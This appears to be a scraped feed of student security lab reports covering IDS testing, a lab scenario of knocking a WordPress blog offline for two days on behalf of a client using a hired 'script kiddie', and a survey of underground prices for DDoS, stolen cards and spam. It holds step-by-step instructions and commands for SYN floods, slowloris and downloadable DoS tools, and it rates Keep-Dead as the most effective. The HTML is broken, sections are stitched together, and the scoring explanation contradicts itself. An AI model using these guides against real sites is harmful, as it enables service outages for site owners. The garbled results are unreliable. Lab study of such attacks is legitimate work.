ab.sh {target} eg sh ab.sh 192.168.56.101```b) For port scan:```sh scan.sh {target IP} eg sh scan.sh 192.168.56.101```c) For Syn flood (with hping3)```sh synf.sh {target} eg synf.sh 192.168.56.101/wordpress```d) For Sloworis attack:```perl slowloris.pl -dns {target} eg perl sloworis.pl -dns 192.168.56.101/wordpress```e) For Apachekiller attack:```perl apachekiller.pl {target IP} eg perl apachekiller.pl 192.168.56.101```## PROPOSAL 2### IntroFor this scenario we need to run several different attacks and scans to be able to compare the results with different IDS setups and rulesets. We might also want to test it with legitimate traffic to see that we dont get false positives in our alarms. We dont have that much legitimate traffic possibilities with 1 blog on our servers right now, but if we start tweaking the IDS false positives becomes an important metric and we might want to test normal usage and create traffic to run with tcpreplay for example. My proposal is to test the IDS with pytbull running on BackTrack. Pytbull is IDS testing framework and BackTrack a Linux ditribution. I will assume that we have WordPress server with running default Snort set up on it and working. No extensive testing has been done with different snort setups so we might have to tune the methods, but basic things should be covered.### DL and install BackTrack- &lt;a href="http://www.backtrack-linux.org/downloads/" target="_blank"&gt;backtrack-linux.org/downloads/&lt;/a&gt;Install it rather than running a live version for this scenario. Boot it up in default mode, start GUI and launch installation from desktop. Default login root / toor. Standard setup comes with pytbull and several pieces of software the IDS test-system depends on like nmap, hping3, nikto and others.### Setup connectionsConnect the machines and install ftp and ssh on server. We need ftp to get snort alert files and ssh to run attacks against.```apt-get install vsftpd openssh-server```### Setup pytbullYou will find pytbull from ```/pentest/enumeration/ids/pytbull/``` or Applications -&gt; BackTrack -&gt; Information Gathering -&gt; Network Analysis -&gt; IDS IPS Identification -&gt; pytbull when using the GUI. Change the configuration file values to have correct connection information, user credentials and locations of dependencies. Here you also select which test modules out of the 9 available you want to run. ClientSideAttacks needs extra configuration.

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;cd /pentest/enumeration/ids/pytbull/&lt;/p&gt;
&lt;p&gt;gedit config.cfg&lt;/p&gt;
&lt;p&gt;Example conf file: http://www.tud.ttu.ee/\~t061780/attacks/config.cfg&lt;/p&gt;
&lt;p&gt;Now get custom DoS module to have hping SYN flood and ApacheBench DoS
tests covered.&lt;/p&gt;
&lt;p&gt;cd modules&lt;/p&gt;
&lt;p&gt;mv denialOfService.py denialOfService.py-backup&lt;/p&gt;
&lt;p&gt;wget http://www.tud.ttu.ee/\~t061780/attacks/denialOfService.py&lt;/p&gt;
&lt;p&gt;You may want to refer to Pytbull documentation&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    ### Run```/pentest/enumeration/ids/pytbull/pytbull -t WP/Snort server IP;```If everything works you will find html report file under /reports. If you have problems add -d on run for debugging.###(optional) SlowlorisTo have slowloris attack test for pytbull we need to get custom slowloris that allows to set how many packets to send because we dont want the tests to run forever. I added argument s that tells the script to stop after we have sent s packets.

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;cd /pentest/stressing&lt;/p&gt;
&lt;p&gt;wget www.tud.ttu.ee/\~t061780/attacks/slowloris.pl&lt;/p&gt;
&lt;p&gt;Slowloris attack has been written into DoS module, you have to uncomment
it. Lines 47-52.&lt;/p&gt;
&lt;p&gt;gedit /pentest/enumeration/ids/pytbull/modules/denialOfService.py&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    ## PROPOSAL 3For this proposal I will suggest to use open source tool OpenVas for vulnerability scanning, to test our IDS system. It contains many security tools integrated. The security and analysis tools are: Nikto, nmap, ike-scan, snmpwalk, amap, ldapsearch, SLAD (John-the-Ripper, Chkrootkit, LSOF, ClamAV, Tripwire, TIGER, logwatch, trapwatch, lm-sensors, snort and ovaldi), pnscan, portbunny, strobe, w3af, etc.Instructions of installation process, for further more information please refer to &lt;a href="http://www.openvas.org/setup-and-start.html" target="_blank"&gt;http://www.openvas.org/setup-and-start.html&lt;/a&gt;### Step 1: Configure OBS Repository```sudo apt-get -y install python-software-propertiessudo add-apt-repository "deb http://download.opensuse.org/repositories/security:/OpenVAS:STABLE:/v4/xUbuntu_10.04/./"sudo apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys BED1E87979EAFD54 sudo apt-get update

&lt;/div&gt;

&lt;/p&gt;

&lt;h3&gt;Step 2: Quick-Install OpenVAS&lt;/h3&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo apt-get -y install greenbone-security-assistant gsd openvas-cli openvas-manager openvas-scanner openvas-administrator sqlite3 xsltproc

&lt;/div&gt;

&lt;/p&gt;

&lt;h3&gt;Step 3: Quick-Start OpenVAS&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;(copy and paste whole block, during first time you will be asked to set
a password for user “admin”)&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    test -e /var/lib/openvas/CA/cacert.pem || sudo openvas-mkcert -qsudo openvas-nvt-sync test -e /var/lib/openvas/users/om || sudo openvas-mkcert-client -n om -i sudo /etc/init.d/openvas-manager stopsudo /etc/init.d/openvas-scanner stopsudo openvassdsudo openvasmd --migratesudo openvasmd --rebuildsudo killall openvassdsleep 15sudo /etc/init.d/openvas-scanner startsudo /etc/init.d/openvas-manager startsudo /etc/init.d/openvas-administrator restartsudo /etc/init.d/greenbone-security-assistant restarttest -e /var/lib/openvas/users/admin || sudo openvasad -c add_user -n admin -r Admin

&lt;/div&gt;

&lt;/p&gt;

&lt;h3&gt;Step 4: Log into OpenVAS as “admin”&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;Open &lt;code&gt;https://localhost:9392/&lt;/code&gt; or start &lt;code&gt;“gsd”&lt;/code&gt; on a command line as a
regular user (not as root!). Optional we can use and the Slowloris and
Pyloris DoS attacks.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The above solution and tool will help us to check and test our IDS
system usefulness. It tests the following attacks: Port scan, SYN flood,
DoS, etc. The results are presented with nice GUI interface. For more
info about the project please refer to

&lt;/p&gt;

&lt;h1&gt;RESULTS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;After executing the above proposal we will highlight the results.
Nevertheless, only the Proposal 1 was able to run the test. Others two,
Proposal 2 and Proposal 3 were unsuccessful of installation process and
configuration and to run the attacks. Moreover, the result are presented
from the total amount of reports, registered alerts in the snort. This
is done by help of web interface of Basic Analysis and Security Engine
in addition Analysis Console for Intrusion Databases (ACID) project tool
[ACID]. Therefore, the result from the Proposal 1 and from the rest are
highlighted below:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Proposal 1&lt;/li&gt;
&lt;li&gt;DoS – registered alerts: 2;&lt;/li&gt;
&lt;li&gt;Port scan : 8;&lt;/li&gt;
&lt;li&gt;synf.sh: 1344;&lt;/li&gt;
&lt;li&gt;slowloris.pl: 1782;&lt;/li&gt;
&lt;li&gt;
&lt;/p&gt;

&lt;p&gt;apachekiller.pl: not working;&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   &lt;/p&gt;&lt;/p&gt;
&lt;p&gt;Proposal 2&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   &lt;/p&gt;&lt;/p&gt;
&lt;p&gt;pytbull: 0, the message was: Error: FTP error, 550 failed to open
file.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   &lt;/p&gt;&lt;/p&gt;
&lt;p&gt;Proposal 3&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;p&gt;
-   Too complicated to be configured and installed. The instructions and
the procedures should be more easy. After few hours of configuring
and test, tweaks are is still not working. Yet there are many good
tutorials how to configure OpenVAS please refer [OpenVas1] and
[OpenVas2].&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Primarily, setting-up IDS, the Snort, it is not an easy task to
complete. On the other hand, configuring, installing, etc. the testing
tools for IDS system is even more complicated. Therefore, the Proposal 1
has the best solution and installation process of the test tools.
Despite, that it was the only one that worked. Finally, recommendation
for the IDS solutions and in addition to the penetrating tools to test
the usefulness of IDS has to be more simple and stepwise solution.
However, the above scenario and proposals are great tools and solutions
for a future reader.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The goal of this laboratory test is to make effort to attack server and
to deface website. Here is the scenario: your client is worried about
some stuff posted on a blog. They ask You to take care of it. They have
a throwaway “script kiddie”[Script …&lt;/p&gt;</summary><content type="html">&lt;h1&gt;PURPOSE and SCENARIO&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The goal of this laboratory test is to make effort to attack server and
to deface website. Here is the scenario: your client is worried about
some stuff posted on a blog. They ask You to take care of it. They have
a throwaway “script kiddie”[Script kiddie] in a third world country, who
will mount the attack so You don’t need to worry about hiding the
attackers identity.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, we need to devise a way to attack wordpress (default
installation) based site to render it unusable (page view times over 60
seconds). Attack resources: one PC with Microsoft Windows XP, a script
kiddie, internet connection of 2Mbit/s. In addition, server has to stay
down for two days and script kiddie has up to 1 day to set up the
attack.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For scenario above their three different proposals from the fallow
students. Each proposal is described in section Proposals and their
effectiveness, installation process and the evaluation of the efficient
use of available resources.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, easy solution for limiting the internet connection of 2Mbit/s
by Oracle VirtualBox configuration manager. Secondly, the bandwidth
capacity of the connection and their performance is measured by vnstat1
for graphs to display our utilization. The steps are vivid on section
Methods.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, providing measurement results with different proposals will
help us to identify the most beneficial proposal for above scenario,
declared in Conclusion section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, after each attack, test the virtual server environment is
restarted, because of the affective situation that server after attack
needs time to recover.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;METHODS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Because of requirements of our scenario we need to limit the internet
connection of 2 Mbit/s and to provide graphs that can help as with the
measurement results to conclude which proposals is more competent.
Therefore, Method 1 is describing the step how we limited the connection
bandwidth and Method 2 providing as solution how to setup that can help
you in measuring the speed and the bandwidth.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;METHOD 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;For limiting the internet traffic of the server we have to do the
following steps in command prompt. The following solution is gathered
from Manual of Oracle Virtualbox, Chapter 8 [User Manual].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Limiting VirtualBox – virtual environment speed of network interface:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    VBoxManage modifyvm "[name of virtualbox]" --nicspeed2 2048

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Where you need to replace name of virtual box with real one, and specie
which network interface adapter you wont to limited. In the above
illustration is only second network adapter affected and then you set
the limitation, in our case is 2 Mbit/s.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, to make sure that the result have been effective please use
the following command:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    VBoxManage showvminfo "[name of virtualbox]"

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Results and information important to be aware refer to Appendix 1.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;METHOD 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;We are going to install an application that will help us to gather a
visual graphs of traffic manipulation of script kiddie. The application
is vnstat.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In the server virtual environment in command prompt please type the
following command:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sudo apt-get install vnstat&lt;br&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Next step is to select which interface should be monitored and create
graphs. In our case is eth1, which is second network interface. For
furthermore detailed installation process please refer to the following
link:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.4geeksfromnet.com/2009/04/graphical-bandwidth-monitor-for-ubuntu.html"&gt;http://www.4geeksfromnet.com/2009/04/graphical-bandwidth-monitor-for-ubuntu.html&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To check if the installation process is finished please use your
browser, as shown in illustration 1 and on the address bar type:
http://192.168.56.102/vnstat&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 1: Vnstat PHP interface&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;PROPOSALS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The three proposals are following and described in each different
section and their results. The main measure goal which is going to grate
for kiddie script is: easy to use instructions, the most efficient use
of available resources and can the script be up to 1 day attacking.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the results will be provided with two different graphs in
period of 5 minutes attack and 10 minutes attack. Which would guide us
to compare which kiddie script has performed the attack more in force.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;This is the first proposal and the installation process instruction:
Script kiddie uses a little program to connection flood the WordPress
installation! The program uses Apache autobench to take the site down in
seconds.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Guide for the scipt Kiddie:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Download the program from
    &lt;a href="http://enos.itcollege.ee/~avein/anti2.rar"&gt;http://enos.itcollege.ee/~avein/anti2.rar&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Unpack and run AntiXakkerv2.0.exe&lt;/li&gt;
&lt;li&gt;Enter the address for wordpress site and press the button&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Above script did no run/work on the VirtualMachine Windows XP.
Therefore, from the same author we have other solution:&lt;/p&gt;
&lt;p&gt;​1. Download
&lt;a href="http://enos.itcollege.ee/%7Eavein/anti.exe"&gt;http://enos.itcollege.ee/\~avein/anti.exe&lt;/a&gt;,
save it on Desktop&lt;/p&gt;
&lt;p&gt;​2. Open Start menu, select run and type “cmd” into the box and press
enter&lt;/p&gt;
&lt;p&gt;​3. Drag anti.exe file to the black box (commandline) , select the box
and type the address of your server ( eg. www.delfi.ee ) after the
anti.exe&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;For example, if the address for your webserver is 192.168.56.101 type
the following:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    anti.exe 192.168.56.101&lt;br&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Press enter and the site will go down very soon :=) P.S. This is
    lightweight version tat doesnot use much bandwith and is targeted
    against a bug in apache server :)&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;h3&gt;RESULT 1&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;After running the first proposal we can see that the script kiddie does
attack the server, but the server was reachable after a bit long delay,
but still we could access to the wordpress.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Here are some results graphs.&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;5 minutes attack&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 2: Proposal 1, 5 min, traffic graph&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;10 minutes attack&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 3: Proposal 1, 10 min, traffic graph&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;On the one hand the script kiddie did attack the server, but on the
other hand the server was still accessible. I’d like to conclude by
stating that the above script did not meet our needs, and it did not
stop, bring down the response time of the server.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Second proposal and the installation process:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;You (Script kiddie) download the file from &lt;a href="http://share.ee/x49176f"&gt;http://share.ee/x49176f&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;You will get an warning message, but you continue to download anyway&lt;/li&gt;
&lt;li&gt;In chrome it looks like this&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Execute the file&lt;/li&gt;
&lt;li&gt;Will get a warning but continue&lt;/li&gt;
&lt;li&gt;Will look something like this&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Insert the URL to attack and define how long you want to attack&lt;/li&gt;
&lt;li&gt;Will look like&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Enjoy&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;The script is basic vbscript that will overwhelm the server by as many
connections that are required to keep the server down for as long as you
define.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The above script did not work on the laboratory performance, because it
had an code error. Therefore, for this proposal we are not able to
provide you with the result graphs&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 3&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Third proposal and the installation process is listed below: There is a
free and very easy Denial of service script written in PHP, called
Keep-Dead (Version 1.14). You can download it from the following link:
&lt;a href="http://www.esrun.co.uk/blog/imp/2011/03/Keep-Dead.zip"&gt;http://www.esrun.co.uk/blog/imp/2011/03/Keep-Dead.zip&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;It is developed for a research purpose, but still we can use it for our
scenario. The good think is primarily meant for use via the terminal;
although it will also work if launched via the browser.&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Unpack the Keep-Dead.zip&lt;/li&gt;
&lt;li&gt;Open in notepad or any other text/script editor&lt;/li&gt;
&lt;li&gt;On line #26 change the
    &lt;code&gt;$target_url = “http://www.example.com/wordpress/?s=%rand%”;&lt;/code&gt; to our
    targeted wordpress blog. We can stop even certain page or post in
    wordpres or use of &lt;code&gt;%rand%&lt;/code&gt; for a random value to be automatically
    generated for each individual request • You can change the maximum
    number of requests to be made on line #32&lt;/li&gt;
&lt;li&gt;Changeable is maximum number of requests to be made per connection
    #37, etc.&lt;/li&gt;
&lt;li&gt;After setting the setting of our needs save the file.&lt;/li&gt;
&lt;li&gt;And in terminal you need to run the following script:
    &lt;code&gt;php –e keep-dead.php&lt;/code&gt; or if you run a xamp or other webserver it is
    possible to run the script from your browser.&lt;/li&gt;
&lt;li&gt;You can terminate the script by pressing CTRL+C in terminal console
    or stop/close the browser.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;For more information or video tutorials please refer to the following
link: &lt;a href="http://www.esrun.co.uk/blog/keep-alive-dos-script/"&gt;http://www.esrun.co.uk/blog/keep-alive-dos-script/&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;If we follow the above steps we can perform our scenario 3 to make the
server to stay down for two days or even more.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;There many ways to keep the server down for two days, this script for me
is kind of easy usable. In addition, the author had provide and more
details with following content: In addition of my proposal pls install
the following script:
&lt;a href="http://windows.php.net/downloads/releases/php-5.3.8-nts-Win32-VC9-x86.msi"&gt;http://windows.php.net/downloads/releases/php-5.3.8-nts-Win32-VC9-x86.msi&lt;/a&gt;
in the installation process in the section of Select Web Server you wish
to setup please chose Do not setup a web server -&gt; Next click on the
PHP small narrow down icon and select Entire future will be installed on
local hard drive (second option) -&gt; Next -&gt;Install&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The results and graphs of the above proposal are demonstrated in the
next section.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;This is the script that actually does the job and it keeps the server
down until the script is down.&lt;/p&gt;
&lt;/p&gt;

&lt;h3&gt;RESULT 3&lt;/h3&gt;
&lt;/p&gt;

&lt;p&gt;Test results are following:&lt;/p&gt;
&lt;p&gt;​1. 5 minutes attack&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 4: Proposal 3, 5 min, traffic graph&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;10 minutes attack&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 5: Proposal 3, 10 min, traffic graph&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;A case in point is that from the above graphs we can see that the server
does get more traffic and it does get attacked by the script kiddie.
Illustration 6, bellow demonstrated that actually the server is down, is
not responding any more to requests.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Illustration 6: Proposal 3, server down after trying to reach the blog&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;There are three points that we should consider and to see which proposal
was more accurate and it did the job that was required in the scenario.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;First I would like to start with rating from 1 to 5 each proposal.
Higher score present better results. Which is proving our destination to
hold down the server for longer then one day. The bellow table
demonstrates which proposal has succeed.&lt;/p&gt;
&lt;/p&gt;

&lt;table&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;thead&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;th&gt;
&lt;/th&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;th align="center"&gt;
Proposal 1

&lt;/th&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;th align="center"&gt;
Proposal 2

&lt;/th&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;th align="right"&gt;
Proposal 3

&lt;/th&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/thead&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tbody&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td&gt;
Easy installation

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="right"&gt;

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td&gt;
Server down

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="right"&gt;
5

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td&gt;
TOTAL

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;
8

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="center"&gt;
6

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;td align="right"&gt;
9

&lt;/td&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tr&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/tbody&gt;
&lt;/p&gt;
&lt;p&gt;
&lt;/table&gt;

&lt;/p&gt;

&lt;p&gt;On the scoring rate 3 of server down is means that the server was down,
but after few seconds was retrievable. Where the highest score 5 means
that the server was not retrievable during this proposal test until we
shutdown or cancel the process of script kiddie. In addition, the
Proposal 3 due to a code error was not able to perform attack, that is
why it is graded with server down score of 1. Therefore, our winner for
this laboratory test is Proposal 3 with script kiddie Keep-dead.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The next issue that I would like to focus is to the network speed,
tested with other tool bmon2 which manifests that the speed limit of the
bandwidth did not go over the 2 Mbit/s.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, the above proposals are nice and good example to have an
view of how and with what tools we should perform script kiddie
techniques. How to shutdown access to a server. On the whole, it show as
how to use tools and methods of measuring the bandwidth of network and
how to limit the transfer in comfortable way.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;APPENDIXES&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Appendix 1 is connected with the Method 1, which highlighted points are
illustration on what information we should check, to clarify that the
virtual environment has limitation of the network interface. Where
Appendix 2 is for installation process of Ubuntu Server 10.04 LTS and
wordpress, mysql installation.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify the costs of nowadays
most known attack  DDOS, leak of credit card numbers, infected machine
and never the less sending spam for 1 000 000 (one million) people.
There are few points that should be presented:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Where did we discovered …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;PURPOSE&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify the costs of nowadays
most known attack  DDOS, leak of credit card numbers, infected machine
and never the less sending spam for 1 000 000 (one million) people.
There are few points that should be presented:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Where did we discovered the information (links or sources)&lt;/li&gt;
&lt;li&gt;What kind of source of communication we used, for instance: instant
    messing, ICQ, IRC, which contact we have gather the information&lt;/li&gt;
&lt;li&gt;What are the prices for the above attacks.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;First of all, we must bear in mind that collecting the above information
it is presented to a numerous affected sources ( i.e. Website, news,
forums, IRC chat,etc.). By visiting the source can lead you to a virus,
trojan, malicious code, malware, etc. Which can damage your system.
Therefore, we are going to use virtual environment to find our demands.
In addition, we will use different languages and different search
engines.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Construction of report is separated by tasks section. Where each section
is presented with the source, communication type and the costs of the
service. In addition, in Appendix 1 we give the configuration of virtual
environment.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally the conclusion made of all collected data will be concise in
conclusion section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;TASKS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Following list is the numeration of the tasks:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;DDoS&lt;/li&gt;
&lt;li&gt;Credit Card Numbers&lt;/li&gt;
&lt;li&gt;Infected Machines&lt;/li&gt;
&lt;li&gt;Spam for 1 000 000 people&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;h2&gt;TASK 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Source where we can find information about the cost of DDoS attacks are
provided in Russian most known [Hackzone] forum. This is the source will
give as more of the answers. But again be careful when you accessing
this site. It is on your own risk.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From the following link we received an information about DDoS
attacks: [HackzoneDDoS]. With the following translated statement:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    The average price of service from $ 50 per day. Depends on the complexity of the &lt;em&gt;attacked site. Methods of payment accepted via WebMoney. The network is practically around the clock!Commands:http / https / icmp / post / syn / udp /Price:Day from $ 50Week from $ 350From $ 1200 per month(Prices may change depending of type and timing of orders on the complexity of the attacked site)Demo test for 5-10 minutes.Contact:Icq :20-**-29Inspections completed:hack-world.orgwww.xaker.nameforum.xaknet.ruMost of the DDoS attack service are around per day $ 50, here is an other source and contact details:Contact details Icq:22-**-327Icq:875-**3E-mail:anti**os@jab**r.ru

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The above information is from the following link:
&lt;a href="http://www.hackzone.ru/forum/open/id/15608/"&gt;http://www.hackzone.ru/forum/open/id/15608/&lt;/a&gt;. Other sources that can be
found are with&lt;/p&gt;
&lt;p&gt;the following links: &lt;a href="http://www.hackzone.ru/forum/open/id/16067/"&gt;http://www.hackzone.ru/forum/open/id/16067/&lt;/a&gt; and
&lt;a href="http://www.hackzone.ru/forum/open/id/17187/"&gt;http://www.hackzone.ru/forum/open/id/17187/&lt;/a&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As we stated above that the price is from \$50 per day and it goes until
\$350 per month and so on.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;TASK 2&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;The number of credit cards leaked in the web are numerous amount. The
prices are not that high as people expected. For card that comes from
European country is the highest price and for the other are much
cheaper.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Here some information from the following link, leak from &lt;a href="http://www.hackzone.ru/memb/view/name/Support_BM/"&gt;Support_BM
Originar&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;source is in Russian language, so for this report is translated to
English. From the source [CartNumber].&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;h2&gt;TASK 3&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Nowadays it is not hard to find an infected machine/computer. Because
most of the user PC’s are based with operating system Windows and are
most of them infected. I have try so hard to find infected machine
price, but until today, I did not come up with any good source.
Therefore, I would like if it is possible to add this source and discuss
this source and information with the fellow students.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;TASK 4&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Spamming for one million people it sounds impossible, but still out
there someone is offering this service. Here is from Kazakhstan source
with the following information, translated in English:&lt;/p&gt;
&lt;/p&gt;

